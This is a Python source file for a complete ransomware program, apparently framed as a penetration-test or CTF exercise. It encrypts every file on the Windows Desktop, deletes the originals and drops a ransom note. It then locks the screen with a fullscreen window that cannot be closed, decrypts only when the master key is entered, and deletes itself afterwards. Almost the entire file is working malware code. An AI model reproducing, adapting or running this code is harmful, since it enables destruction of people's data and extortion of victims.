import os
import sys
import tkinter as tk
from tkinter import messagebox
from cryptography.fernet import Fernet

# --- CONFIGURATION ---
EXTENSION = ".LOCKED"
KEY_FILENAME = "secret.key"
CONFIG_FILENAME = "payload_config.txt"
NOTE_FILENAME = "ContactGetKey.txt"

def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def get_desktop_path():
    """ Find the Desktop even if it is moved to OneDrive """
    home = os.environ.get('USERPROFILE')
    paths = [
        os.path.join(home, 'Desktop'),
        os.path.join(home, 'OneDrive', 'Desktop')
    ]
    for p in paths:
        if p and os.path.exists(p):
            return p
    return os.path.join(home, 'Desktop')

TARGET_DIR = get_desktop_path()

def create_victim_note(contact):
    """ Creates a text file on the desktop explaining the situation """
    note_path = os.path.join(TARGET_DIR, NOTE_FILENAME)
    message = f"""--- YOUR FILES ARE ENCRYPTED ---

All your important documents on this path: {TARGET_DIR}
have been locked with a military-grade encryption algorithm.

What happened?
Your computer was part of a security penetration test. 
If you can see this, your security measures failed.

How to get your files back?
To restore your data, you need the Master Key.
Contact the administrator here: {contact}

DO NOT DELETE THE .LOCKED FILES, OR YOU WILL LOSE YOUR DATA FOREVER.
"""
    try:
        with open(note_path, "w") as f:
            f.write(message)
    except:
        pass

def get_executable_path():
    """ Get the path of the running script/exe """
    if getattr(sys, 'frozen', False):
        return os.path.abspath(sys.executable)
    else:
        return os.path.abspath(__file__)

def load_contact_info():
    """ Load contact info from config file """
    try:
        config_path = resource_path(os.path.join("modules", CONFIG_FILENAME))
        with open(config_path, "r") as f:
            for line in f:
                if line.startswith("Contact:"):
                    return line.split("Contact:")[1].strip()
    except:
        pass
    return "anonymous@ctf.local"

CONTACT_INFO = load_contact_info()

def encrypt_desktop(key):
    """ Scrambles files and appends extension """
    try:
        f = Fernet(key.strip())
    except:
        return

    for root, dirs, files in os.walk(TARGET_DIR):
        for name in files:
            # Skip the locker, keys, notes, and already locked files
            if name.endswith(EXTENSION) or "MASTERLock" in name or name == KEY_FILENAME or name == NOTE_FILENAME:
                continue
            
            filepath = os.path.join(root, name)
            new_filepath = filepath + EXTENSION
            try:
                with open(filepath, "rb") as _file:
                    data = _file.read()
                
                encrypted_data = f.encrypt(data)
                
                with open(new_filepath, "wb") as _file:
                    _file.write(encrypted_data)
                
                if os.path.exists(new_filepath):
                    os.remove(filepath)
            except:
                continue

def decrypt_desktop(key):
    """ Restores files and removes extensions """
    try:
        # Strip key to ensure no newline characters interfere with decryption
        f = Fernet(key.strip())
    except:
        return

    for root, dirs, files in os.walk(TARGET_DIR):
        for name in files:
            if name.endswith(EXTENSION):
                filepath = os.path.join(root, name)
                original_path = filepath[:-len(EXTENSION)]
                try:
                    with open(filepath, "rb") as _file:
                        data = _file.read()
                    
                    decrypted_data = f.decrypt(data)
                    
                    with open(original_path, "wb") as _file:
                        _file.write(decrypted_data)
                    
                    os.remove(filepath)
                except:
                    continue
    
    # Remove the ransom note after successful decryption
    note_path = os.path.join(TARGET_DIR, NOTE_FILENAME)
    if os.path.exists(note_path):
        os.remove(note_path)

class RansomwareGUI:
    def __init__(self, master, master_key):
        self.master = master
        self.master_key = master_key # Loaded as bytes
        self.master.title("SYSTEM ENCRYPTED")
        self.master.attributes('-fullscreen', True)
        self.master.attributes('-topmost', True)
        self.master.configure(bg='black')
        self.master.protocol("WM_DELETE_WINDOW", lambda: None)
        self.create_main_view()

    def create_main_view(self):
        self.frame = tk.Frame(self.master, bg='black')
        self.frame.place(relx=0.5, rely=0.5, anchor='center')
        
        tk.Label(self.frame, text="YOU GOT HACKED BY MY MASTER", font=('Courier', 40, 'bold'), fg='#00FF00', bg='black').pack(pady=20)
        tk.Label(self.frame, text=f"All files in {TARGET_DIR} are LOCKED", font=('Courier', 18), fg='red', bg='black').pack()
        tk.Label(self.frame, text=f"CONTACT: {CONTACT_INFO}", font=('Courier', 20, 'bold'), fg='#00FF00', bg='black').pack(pady=20)
        
        warning_text = "Closing this window will NOT unlock your files.\nRead ContactGetKey.txt for instructions."
        tk.Label(self.frame, text=warning_text, font=('Courier', 12), fg='white', bg='black').pack(pady=10)
        
        tk.Button(self.frame, text="GO TO UNLOCK PANEL", font=('Courier', 15), fg='black', bg='#00FF00', command=self.show_input).pack(pady=30)

    def show_input(self):
        self.frame.destroy()
        self.input_frame = tk.Frame(self.master, bg='black')
        self.input_frame.place(relx=0.5, rely=0.5, anchor='center')
        
        tk.Label(self.input_frame, text="DECRYPTION PANEL", font=('Courier', 30, 'bold'), fg='#00FF00', bg='black').pack(pady=10)
        tk.Label(self.input_frame, text=f"Contact for key: {CONTACT_INFO}", font=('Courier', 14), fg='red', bg='black').pack(pady=5)
        
        tk.Label(self.input_frame, text="ENTER MASTER KEY:", font=('Courier', 18), fg='#00FF00', bg='black').pack(pady=20)
        self.key_entry = tk.Entry(self.input_frame, width=50, font=('Courier', 12), justify='center')
        self.key_entry.pack(pady=10)
        
        tk.Button(self.input_frame, text="VERIFY & RESTORE FILES", font=('Courier', 15, 'bold'), bg='#00FF00', command=self.attempt_unlock).pack(pady=20)
        tk.Button(self.input_frame, text="BACK", font=('Courier', 10), bg='gray', command=self.reset_gui).pack()

    def reset_gui(self):
        self.input_frame.destroy()
        self.create_main_view()

    def attempt_unlock(self):
        # Clean the user input and the stored master key for a fair comparison
        entered_key = self.key_entry.get().strip().encode()
        clean_stored_key = self.master_key.strip()

        if entered_key == clean_stored_key:
            decrypt_desktop(clean_stored_key)
            messagebox.showinfo("RECOVERY", "Decryption Successful. Files restored.")
            self.self_destruct()
        else:
            messagebox.showerror("DENIED", "Invalid Master Key! Check for accidental spaces.")

    def self_destruct(self):
        exe_path = get_executable_path()
        self.master.destroy()
        
        # Self-deletion batch script (No Registry references)
        if os.name == 'nt':
            with open("cleanup.bat", "w") as f:
                f.write(f'timeout /t 2 /nobreak > NUL\n')
                f.write(f'del "{exe_path}"\n')
                f.write(f'del "cleanup.bat"')
            os.startfile("cleanup.bat")
        sys.exit()

if __name__ == "__main__":
    # Create the note first so the victim knows how to contact
    create_victim_note(CONTACT_INFO)

    # Load the key from bundled resource or local folder
    try:
        with open(resource_path(os.path.join("modules", KEY_FILENAME)), "rb") as k:
            master_key = k.read()
    except:
        with open(KEY_FILENAME, "rb") as k:
            master_key = k.read()

    # Execute encryption
    encrypt_desktop(master_key)

    # Launch UI
    root = tk.Tk()
    app = RansomwareGUI(root, master_key)
    root.mainloop()